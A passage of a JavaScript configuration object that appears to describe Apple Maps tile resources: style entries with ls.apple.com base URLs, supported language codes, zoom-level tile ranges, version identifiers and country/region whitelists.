          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-kittyhawk-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 52,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 0,
          deviceSKUWhitelist: [],
          supportedLanguage: [],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe11-ssl.ls.apple.com/tile",
          validVersion: [
            { genericTile: [], availableTiles: [], identifier: 1 },
          ],
        },
        {
          scale: 0,
          style: 53,
          checksumType: 0,
          requestStyle: 1,
          supportsMultipathTCP: !1,
          dataSet: 0,
          size: 2,
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "es-US",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
              ],
              identifier: 16329310,
              genericTile: [],
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 53,
          checksumType: 0,
          requestStyle: 1,
          supportsMultipathTCP: !1,
          dataSet: 1,
          size: 2,
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "es-US",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
              ],
              identifier: 16330272,
              genericTile: [],
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-kittyhawk-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 54,
          checksumType: 0,
          requestStyle: 1,
          supportsMultipathTCP: !1,
          dataSet: 0,
          size: 2,
          supportedLanguage: [],
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
              ],
              identifier: 13658945,
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 54,
          checksumType: 0,
          requestStyle: 1,
          supportsMultipathTCP: !1,
          dataSet: 1,
          size: 2,
          supportedLanguage: [],
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
              ],
              identifier: 13659050,
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-kittyhawk-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 56,
          checksumType: 0,
          requestStyle: 0,
          supportsMultipathTCP: !1,
          dataSet: 0,
          size: 2,
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "es-US",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                {
                  maxX: 131071,
                  minZ: 17,
                  minX: 0,
                  maxY: 131071,
                  minY: 0,
                  maxZ: 17,
                },
              ],
              identifier: 16329310,
              genericTile: [],
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 56,
          checksumType: 0,
          requestStyle: 0,
          supportsMultipathTCP: !1,
          dataSet: 1,
          size: 2,
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "es-US",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                {
                  maxX: 131071,
                  minZ: 17,
                  minX: 0,
                  maxY: 131071,
                  minY: 0,
                  maxZ: 17,
                },
              ],
              identifier: 16330272,
              genericTile: [],
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-kittyhawk-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 57,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 1,
          deviceSKUWhitelist: [],
          supportedLanguage: [],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe76-ssl.ls.apple.com/api/tile",
          validVersion: [
            {
              availableTiles: [
                {
                  maxX: 131071,
                  minZ: 17,
                  minX: 0,
                  maxY: 131071,
                  minY: 0,
                  maxZ: 17,
                },
              ],
              identifier: 0,
              timeToLiveSeconds: 3600,
              genericTile: [],
            },
          ],
        },
        {
          scale: 0,
          style: 58,
          checksumType: 0,
          requestStyle: 0,
          supportsMultipathTCP: !1,
          dataSet: 0,
          size: 2,
          supportedLanguage: [],
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
                { maxX: 3, minZ: 2, minX: 0, maxY: 3, minY: 0, maxZ: 2 },
                { maxX: 7, minZ: 3, minX: 0, maxY: 7, minY: 0, maxZ: 3 },
                { maxX: 15, minZ: 4, minX: 0, maxY: 15, minY: 0, maxZ: 4 },
                { maxX: 31, minZ: 5, minX: 0, maxY: 31, minY: 0, maxZ: 5 },
                { maxX: 63, minZ: 6, minX: 0, maxY: 63, minY: 0, maxZ: 6 },
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
                { maxX: 255, minZ: 8, minX: 0, maxY: 255, minY: 0, maxZ: 8 },
                { maxX: 511, minZ: 9, minX: 0, maxY: 511, minY: 0, maxZ: 9 },
                {
                  maxX: 1023,
                  minZ: 10,
                  minX: 0,
                  maxY: 1023,
                  minY: 0,
                  maxZ: 10,
                },
                {
                  maxX: 2047,
                  minZ: 11,
                  minX: 0,
                  maxY: 2047,
                  minY: 0,
                  maxZ: 11,
                },
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
                {
                  maxX: 16383,
                  minZ: 14,
                  minX: 0,
                  maxY: 16383,
                  minY: 0,
                  maxZ: 14,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
                {
                  maxX: 65535,
                  minZ: 16,
                  minX: 0,
                  maxY: 65535,
                  minY: 0,
                  maxZ: 16,
                },
                {
                  maxX: 131071,
                  minZ: 17,
                  minX: 0,
                  maxY: 131071,
                  minY: 0,
                  maxZ: 17,
                },
              ],
              identifier: 16329310,
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 58,
          checksumType: 0,
          requestStyle: 0,
          supportsMultipathTCP: !1,
          dataSet: 1,
          size: 2,
          supportedLanguage: [],
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
                { maxX: 3, minZ: 2, minX: 0, maxY: 3, minY: 0, maxZ: 2 },
                { maxX: 7, minZ: 3, minX: 0, maxY: 7, minY: 0, maxZ: 3 },
                { maxX: 15, minZ: 4, minX: 0, maxY: 15, minY: 0, maxZ: 4 },
                { maxX: 31, minZ: 5, minX: 0, maxY: 31, minY: 0, maxZ: 5 },
                { maxX: 63, minZ: 6, minX: 0, maxY: 63, minY: 0, maxZ: 6 },
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
                { maxX: 255, minZ: 8, minX: 0, maxY: 255, minY: 0, maxZ: 8 },
                { maxX: 511, minZ: 9, minX: 0, maxY: 511, minY: 0, maxZ: 9 },
                {
                  maxX: 1023,
                  minZ: 10,
                  minX: 0,
                  maxY: 1023,
                  minY: 0,
                  maxZ: 10,
                },
                {
                  maxX: 2047,
                  minZ: 11,
                  minX: 0,
                  maxY: 2047,
                  minY: 0,
                  maxZ: 11,
                },
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
                {
                  maxX: 16383,
                  minZ: 14,
                  minX: 0,
                  maxY: 16383,
                  minY: 0,
                  maxZ: 14,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
                {
                  maxX: 65535,
                  minZ: 16,
                  minX: 0,
                  maxY: 65535,
                  minY: 0,
                  maxZ: 16,
                },
                {
                  maxX: 131071,
                  minZ: 17,
                  minX: 0,
                  maxY: 131071,
                  minY: 0,
                  maxZ: 17,
                },
              ],
              identifier: 16330272,
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-kittyhawk-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 59,
          checksumType: 0,
          requestStyle: 0,
          supportsMultipathTCP: !1,
          dataSet: 0,
          size: 2,
          supportedLanguage: [],
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
              ],
              identifier: 16329310,
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-ssl.ls.apple.com/asset/v3/model",
        },
        {
          scale: 0,
          style: 59,
          checksumType: 0,
          requestStyle: 0,
          supportsMultipathTCP: !1,
          dataSet: 1,
          size: 2,
          supportedLanguage: [],
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
              ],
              identifier: 16330272,
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-kittyhawk-ssl.ls.apple.com/asset/v3/model",
        },
        {
          scale: 0,
          style: 60,
          checksumType: 0,
          requestStyle: 0,
          supportsMultipathTCP: !1,
          dataSet: 0,
          size: 2,
          supportedLanguage: [],
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
                { maxX: 3, minZ: 2, minX: 0, maxY: 3, minY: 0, maxZ: 2 },
                { maxX: 7, minZ: 3, minX: 0, maxY: 7, minY: 0, maxZ: 3 },
                { maxX: 15, minZ: 4, minX: 0, maxY: 15, minY: 0, maxZ: 4 },
                { maxX: 31, minZ: 5, minX: 0, maxY: 31, minY: 0, maxZ: 5 },
                { maxX: 63, minZ: 6, minX: 0, maxY: 63, minY: 0, maxZ: 6 },
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
                { maxX: 255, minZ: 8, minX: 0, maxY: 255, minY: 0, maxZ: 8 },
                { maxX: 511, minZ: 9, minX: 0, maxY: 511, minY: 0, maxZ: 9 },
              ],
              identifier: 16329310,
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-ssl.ls.apple.com/asset/v3/material",
        },
        {
          scale: 0,
          style: 60,
          checksumType: 0,
          requestStyle: 0,
          supportsMultipathTCP: !1,
          dataSet: 1,
          size: 2,
          supportedLanguage: [],
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
                { maxX: 3, minZ: 2, minX: 0, maxY: 3, minY: 0, maxZ: 2 },
                { maxX: 7, minZ: 3, minX: 0, maxY: 7, minY: 0, maxZ: 3 },
                { maxX: 15, minZ: 4, minX: 0, maxY: 15, minY: 0, maxZ: 4 },
                { maxX: 31, minZ: 5, minX: 0, maxY: 31, minY: 0, maxZ: 5 },
                { maxX: 63, minZ: 6, minX: 0, maxY: 63, minY: 0, maxZ: 6 },
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
                { maxX: 255, minZ: 8, minX: 0, maxY: 255, minY: 0, maxZ: 8 },
                { maxX: 511, minZ: 9, minX: 0, maxY: 511, minY: 0, maxZ: 9 },
              ],
              identifier: 16330272,
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL:
            "https://gspe19-kittyhawk-ssl.ls.apple.com/asset/v3/material",
        },
        {
          scale: 0,
          style: 61,
          checksumType: 0,
          requestStyle: 0,
          supportsMultipathTCP: !1,
          dataSet: 0,
          size: 2,
          supportedLanguage: [],
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
              ],
              identifier: 16329310,
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 61,
          checksumType: 0,
          requestStyle: 0,
          supportsMultipathTCP: !1,
          dataSet: 1,
          size: 2,
          supportedLanguage: [],
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
              ],
              identifier: 16330272,
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-kittyhawk-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 62,
          checksumType: 0,
          requestStyle: 0,
          supportsMultipathTCP: !1,
          dataSet: 0,
          size: 2,
          supportedLanguage: [],
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
              ],
              identifier: 16329310,
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 62,
          checksumType: 0,
          requestStyle: 0,
          supportsMultipathTCP: !1,
          dataSet: 1,
          size: 2,
          supportedLanguage: [],
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
              ],
              identifier: 16330272,
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-kittyhawk-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 64,
          checksumType: 0,
          requestStyle: 0,
          supportsMultipathTCP: !1,
          dataSet: 0,
          size: 2,
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "es-US",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
              ],
              identifier: 16329310,
              genericTile: [],
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 64,
          checksumType: 0,
          requestStyle: 0,
          supportsMultipathTCP: !1,
          dataSet: 1,
          size: 2,
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "es-US",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
              ],
              identifier: 16330272,
              genericTile: [],
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-kittyhawk-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 65,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 1,
          deviceSKUWhitelist: [],
          supportedLanguage: [],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe79-ssl.ls.apple.com/65/v1",
          validVersion: [
            {
              availableTiles: [
                { maxX: 255, minZ: 8, minX: 0, maxY: 255, minY: 0, maxZ: 8 },
              ],
              identifier: 2,
              timeToLiveSeconds: 3600,
              genericTile: [],
            },
          ],
        },
        {
          scale: 0,
          style: 66,
          checksumType: 0,
          requestStyle: 0,
          supportsMultipathTCP: !1,
          dataSet: 0,
          size: 2,
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "es-US",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
                { maxX: 3, minZ: 2, minX: 0, maxY: 3, minY: 0, maxZ: 2 },
                { maxX: 7, minZ: 3, minX: 0, maxY: 7, minY: 0, maxZ: 3 },
                { maxX: 15, minZ: 4, minX: 0, maxY: 15, minY: 0, maxZ: 4 },
                { maxX: 31, minZ: 5, minX: 0, maxY: 31, minY: 0, maxZ: 5 },
                { maxX: 63, minZ: 6, minX: 0, maxY: 63, minY: 0, maxZ: 6 },
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
                { maxX: 255, minZ: 8, minX: 0, maxY: 255, minY: 0, maxZ: 8 },
                { maxX: 511, minZ: 9, minX: 0, maxY: 511, minY: 0, maxZ: 9 },
                {
                  maxX: 1023,
                  minZ: 10,
                  minX: 0,
                  maxY: 1023,
                  minY: 0,
                  maxZ: 10,
                },
                {
                  maxX: 2047,
                  minZ: 11,
                  minX: 0,
                  maxY: 2047,
                  minY: 0,
                  maxZ: 11,
                },
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
                {
                  maxX: 16383,
                  minZ: 14,
                  minX: 0,
                  maxY: 16383,
                  minY: 0,
                  maxZ: 14,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
              ],
              identifier: 16329310,
              genericTile: [],
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [
            { countryCode: "AE", region: "AE" },
            { countryCode: "AE", region: "SA" },
            { countryCode: "IN", region: "" },
            { countryCode: "JP", region: "JP" },
            { countryCode: "KR", region: "KR" },
            { countryCode: "MA", region: "MA" },
            { countryCode: "RU", region: "RU" },
            { countryCode: "SA", region: "AE" },
            { countryCode: "SA", region: "SA" },
            { countryCode: "VN", region: "VN" },
          ],
          baseURL: "https://gspe19-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 66,
          checksumType: 0,
          requestStyle: 0,
          supportsMultipathTCP: !1,
          dataSet: 1,
          size: 2,
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "es-US",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
                { maxX: 3, minZ: 2, minX: 0, maxY: 3, minY: 0, maxZ: 2 },
                { maxX: 7, minZ: 3, minX: 0, maxY: 7, minY: 0, maxZ: 3 },
                { maxX: 15, minZ: 4, minX: 0, maxY: 15, minY: 0, maxZ: 4 },
                { maxX: 31, minZ: 5, minX: 0, maxY: 31, minY: 0, maxZ: 5 },
                { maxX: 63, minZ: 6, minX: 0, maxY: 63, minY: 0, maxZ: 6 },
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
                { maxX: 255, minZ: 8, minX: 0, maxY: 255, minY: 0, maxZ: 8 },
                { maxX: 511, minZ: 9, minX: 0, maxY: 511, minY: 0, maxZ: 9 },
                {
                  maxX: 1023,
                  minZ: 10,
                  minX: 0,
                  maxY: 1023,
                  minY: 0,
                  maxZ: 10,
                },
                {
                  maxX: 2047,
                  minZ: 11,
                  minX: 0,
                  maxY: 2047,
                  minY: 0,
                  maxZ: 11,
                },
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
                {
                  maxX: 16383,
                  minZ: 14,
                  minX: 0,
                  maxY: 16383,
                  minY: 0,
                  maxZ: 14,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
              ],
              identifier: 16330272,
              genericTile: [],
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [
            { countryCode: "AE", region: "AE" },
            { countryCode: "AE", region: "SA" },
            { countryCode: "IN", region: "" },
            { countryCode: "JP", region: "JP" },
            { countryCode: "KR", region: "KR" },
            { countryCode: "MA", region: "MA" },
            { countryCode: "RU", region: "RU" },
            { countryCode: "SA", region: "AE" },
            { countryCode: "SA", region: "SA" },
            { countryCode: "VN", region: "VN" },
          ],
          baseURL: "https://gspe19-kittyhawk-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 67,
          checksumType: 0,
          requestStyle: 0,
          supportsMultipathTCP: !1,
          dataSet: 0,
          size: 2,
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "es-US",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
                { maxX: 3, minZ: 2, minX: 0, maxY: 3, minY: 0, maxZ: 2 },
                { maxX: 7, minZ: 3, minX: 0, maxY: 7, minY: 0, maxZ: 3 },
                { maxX: 15, minZ: 4, minX: 0, maxY: 15, minY: 0, maxZ: 4 },
                { maxX: 31, minZ: 5, minX: 0, maxY: 31, minY: 0, maxZ: 5 },
                { maxX: 63, minZ: 6, minX: 0, maxY: 63, minY: 0, maxZ: 6 },
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
                { maxX: 255, minZ: 8, minX: 0, maxY: 255, minY: 0, maxZ: 8 },
                {
                  maxX: 1023,
                  minZ: 10,
                  minX: 0,
                  maxY: 1023,
                  minY: 0,
                  maxZ: 10,
                },
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
                {
                  maxX: 16383,
                  minZ: 14,
                  minX: 0,
                  maxY: 16383,
                  minY: 0,
                  maxZ: 14,
                },
              ],
              identifier: 16329310,
              genericTile: [],
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [
            { countryCode: "AE", region: "AE" },
            { countryCode: "AE", region: "SA" },
            { countryCode: "IN", region: "" },
            { countryCode: "JP", region: "JP" },
            { countryCode: "KR", region: "KR" },
            { countryCode: "MA", region: "MA" },
            { countryCode: "RU", region: "RU" },
            { countryCode: "SA", region: "AE" },
            { countryCode: "SA", region: "SA" },
            { countryCode: "VN", region: "VN" },
          ],
          baseURL: "https://gspe19-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 67,
          checksumType: 0,
          requestStyle: 0,
          supportsMultipathTCP: !1,
          dataSet: 1,
          size: 2,
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "es-US",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
                { maxX: 3, minZ: 2, minX: 0, maxY: 3, minY: 0, maxZ: 2 },
                { maxX: 7, minZ: 3, minX: 0, maxY: 7, minY: 0, maxZ: 3 },
                { maxX: 15, minZ: 4, minX: 0, maxY: 15, minY: 0, maxZ: 4 },
                { maxX: 31, minZ: 5, minX: 0, maxY: 31, minY: 0, maxZ: 5 },
                { maxX: 63, minZ: 6, minX: 0, maxY: 63, minY: 0, maxZ: 6 },
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
                { maxX: 255, minZ: 8, minX: 0, maxY: 255, minY: 0, maxZ: 8 },
                {
                  maxX: 1023,
                  minZ: 10,
